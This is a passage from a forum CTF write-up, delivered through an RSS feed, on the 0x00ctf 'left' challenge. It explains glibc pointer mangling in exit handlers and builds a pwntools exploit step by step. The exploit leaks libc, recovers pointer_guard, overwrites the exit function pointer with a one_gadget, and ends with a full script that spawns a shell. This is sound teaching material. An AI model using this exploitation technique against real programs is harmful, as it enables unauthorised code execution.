<p>It isn’t a big macro, there’s a ‘<em>ror</em>’ operation followed by a ‘<em>xor</em>’ one.</p>
</li>
<li>
<p>The first operation takes the <strong>(2*0x8)+1 = 0x11</strong> and rotates right the value of the <em>var</em> by that number.</p>
</li>
<li>
<p>The second is a bit problematic, since it goes to the <strong>TCB</strong>(<em>task control block</em>) and takes a secret value named ‘<em>pointer_guard</em>’.</p>
</li>
<li>
<p>But here’s the thing, ‘<em>xor</em>’ can be reversed easily, such as <em>‘2 ^ 0 = 2’</em> =&gt; <em>‘0 = 2 ^ 2’</em>. And that’s what we are going to use, to get the <em>pointer_guard</em> value, so we can mangle our <em>fake pointer</em> later, but to do that, we need the <em>mangled pointer</em>, and the <em>original function</em> that’s been mangled.</p>
</li>
<li>
<p>It’s time to run <strong>gdb</strong> and analyse what’s in there…<br>
Oh lord, it asks for a valid address to read/write, but we just want to analyse exit behaviour for now <img src="/images/emoji/twitter/crying_cat_face.png?v=9" title=":crying_cat_face:" class="emoji" alt=":crying_cat_face:">…<br>
WE’LL <strong>j* 0x4008a6</strong>  BOYS!<br>
But before doing that, let’s set a breakpoint on the <strong>__run_exit_handlers</strong>!</p>
</li>
<li>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/fa8f4b6f96abfb644aa7c02ec5126e06b77ac1be.png" width="484" height="94"></p>
</li>
</ul>
<p>There we go, after jumping to the exit part, we land on that breakpoint.<br>
We then continue stepping ‘<em>ni</em>’ and paying big attention to the instruction block.</p>
<ul>
<li><img src="//0x00sec.s3.amazonaws.com/original/2X/8/8b9ecf745bc1d2ab9f891824b17861fae9cfe282.png" width="638" height="85"></li>
</ul>
<p>Seems like we reached the interesting part, now we step really carefully, and we check <strong>registers</strong> while doing that.<br>
We have <em>RCX</em> register pointing to <strong>initial</strong>, so it will take the <em>mangled pointer</em> and put it in <em>RAX</em>…<br>
[RCX+0x10] is <em>NULL</em>.<br>
Then it’ll do the xor and ror operation, and calls the demangled <em>RAX</em>.</p>
<ul>
<li><img src="//0x00sec.s3.amazonaws.com/original/2X/2/22d84cea8faa92bbc00155b07721c8b3fa0d5cb3.png" width="408" height="67"></li>
</ul>
<p>This says that the original pointer is _dl_fini.</p>
<ul>
<li>And about the <strong>initial</strong> thing, check the second argument <strong>__exit_funcs</strong>, let’s take a look at the source!</li>
</ul>
<pre><code class="lang-auto">static struct exit_function_list initial;
struct exit_function_list *__exit_funcs = &amp;initial;
</code></pre>
<ul>
<li>A little look with <strong>gdb</strong> shows the following:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/2/24ef8d8db7614fb2ca629cd2cc5e99b7eb1c21e2.png" width="289" height="305"><br>
And the pointer we’ll deal with is <strong>at</strong> one.<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/4/4b63d67936efde9871a9abcbe73e8fffee28a07f.png" width="437" height="34"><br>
It’s at 8*3 from <strong>initial</strong>.</li>
</ul>
<p>But we will later find problem with offsets to these structures, since they aren’t exported…</p>
<p>Further reading on that:<br>
<a href="http://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html" rel="noopener nofollow ugc">This awesome article.</a></p>
<ul>
<li>Let’s start writing the exploit slowly:<br>
First things first, we’ll be storing the <em>printf leak</em> and calculating <em>libc_base</em>.</li>
</ul>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *
#
c = process('./left')
# LOCAL
printf_diff = 0x54340
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
# INTERACTIVE
c.interactive()
</code></pre>
<ul>
<li>Now we will editing only <strong>EXPLOIT</strong> and <strong>OFFSET</strong> part…<br>
We will add few offsets, the initial is close to an exported symbol ‘<em>__abort_msg</em>’ + [0x10, 0x20 … 0x100] on multiple libc’s.<br>
And then there’s the big problem ‘<em>_dl_fini</em>’. This one on remote will require creativity to get, either using the arbitrary read to get it, or downloading the same distro as remote.<br>
But since we’re local only here, we are safe, we’ll just get it with <strong>gdb</strong>. (<em>substract libc_base from it</em>)</li>
</ul>
<pre><code class="lang-python"># LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print 'libc_base @ ' + hex(libc_base)
</code></pre>
<ul>
<li>Now, we reach the arbitrary read part, we will leak the <em>mangled pointer</em>!</li>
</ul>
<pre><code class="lang-python"># LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print 'libc_base @ ' + hex(libc_base)
# 
c.recvuntil('read address:')
c.sendline(str(libc_at))
c.recvuntil('content: ')
mangled_ptr = int(c.recvline()[:-1], 10)
print 'mangled_ptr @ ' + hex(mangled_ptr)
</code></pre>
<p>We get<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/4/44c26febd1396c1e69834743b7bf86ddf16aa259.png" width="366" height="50"><br>
And that’s the awaited response, we did well leaking!<br>
Now, moving on…</p>
<ul>
<li>Now we need to calculate the <em>pointer_guard</em> value!</li>
</ul>
<pre><code class="lang-python"># LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print 'libc_base @ ' + hex(libc_base)
# 
c.recvuntil('read address:')
c.sendline(str(libc_at))
c.recvuntil('content: ')
mangled_ptr = int(c.recvline()[:-1], 10)
print 'mangled_ptr @ ' + hex(mangled_ptr)
# 
pointer_guard = ror(mangled_ptr, 0x11, 64) # we do ror operation first
pointer_guard ^= _dl_fini                  # xor with original value
print 'pointer_guard @ ' + hex(pointer_guard)
#
</code></pre>
<ul>
<li>We reached the write part, it request an address to write to and the new value to assign!<br>
That’s perfect for overwriting the ‘<em>at</em>’ to point to 0x1 as a test!</li>
</ul>
<pre><code class="lang-python"># LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print 'libc_base @ ' + hex(libc_base)
# 
c.recvuntil('read address:')
c.sendline(str(libc_at))
c.recvuntil('content: ')
mangled_ptr = int(c.recvline()[:-1], 10)
print 'mangled_ptr @ ' + hex(mangled_ptr)
# 
pointer_guard = ror(mangled_ptr, 0x11, 64) # we do ror operation first
pointer_guard ^= libc_dl                   # xor with original value
print 'pointer_guard @ ' + hex(pointer_guard)
#
address = 0x1
address ^= pointer_guard                   # xor with the pointer_guard
address = rol(address, 0x11, 64)           # reverse ror operation, rol!
# 
pause()                                    # to attach
#
c.recvuntil('write address:')
c.sendline(str(libc_at))
c.recvuntil('new value:')
c.sendline(str(address)) 
</code></pre>
<ul>
<li>
<p>Running the script, attaching to <strong>gdb</strong> and resuming execution gives the following:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/6/6748f14895c459cdcf85c831f75f4bd704e12831.png" width="491" height="135"><br>
<img src="/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> We control <em>RIP</em>.</p>
</li>
<li>
<p>Now what’s left is simple, we will use <a href="https://github.com/david942j/one_gadget" rel="noopener nofollow ugc">one_gadget</a> script by <strong>david942j</strong>.<br>
It will look for gadgets that take the argument ‘<em>/bin/sh</em>’, and call ‘<em>execve</em>’, ‘<em>execl</em>’… (<em>there are multiple of 'em in each libc</em>)<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/a/af2ad36fb43d92450661714d671f6ff3dfdfa651.png" width="644" height="275"><br>
We take the first and try and see if he’ll work, if not, the requirements aren’t met ‘<strong>[rsp + 0x30] == NULL in the first</strong>’!<br>
So we try them one by one.<br>
In my case, the fourth one worked.</p>
</li>
<li>
<p>We can then enjoy our shell!<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/1/1102dd76b286001e45e0b298fb7e7b66f016f794.png" width="362" height="160"></p>
</li>
<li>
<p>Full exploit:</p>
</li>
</ul>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *
#
c = process('./left')
# LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
one_diff = 0xe8618
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
one = libc_base + one_diff
print 'libc_base @ ' + hex(libc_base)
# 
c.recvuntil('read address:')
c.sendline(str(libc_at))
c.recvuntil('content: ')
mangled_ptr = int(c.recvline()[:-1], 10)
print 'mangled_ptr @ ' + hex(mangled_ptr)
# 
pointer_guard = ror(mangled_ptr, 0x11, 64) # we do ror operation first
pointer_guard ^= libc_dl                   # xor with original value
print 'pointer_guard @ ' + hex(pointer_guard)
#
one ^= pointer_guard                       # xor with the pointer_guard
one = rol(one, 0x11, 64)                   # reverse ror operation, rol!
#
pause()
# 
c.recvuntil('write address:')
c.sendline(str(libc_at))
c.recvuntil('new value:')
c.sendline(str(one))
# INTERACTIVE
c.interactive()
</code></pre>
<p>For remote case, check <a href="https://gist.github.com/romanking98/5f5ff9114fc011c9ac8c88aa253bcc69" rel="noopener nofollow ugc">DCUA</a> and <a href="https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/0x00ctf-2017/pwn/left-250" rel="noopener nofollow ugc">SPRITZ</a> writeups.</p>
<p>Hope you liked the article and learned as well! <img src="/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
          <p><a href="https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314/1</link>
        <pubDate>Sun, 04 Feb 2018 19:31:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-5314-1</guid>
        <source url="https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314.rss">0x00ctf Writeup | babyheap &amp; left!</source>
      </item>
  </channel>
</rss>
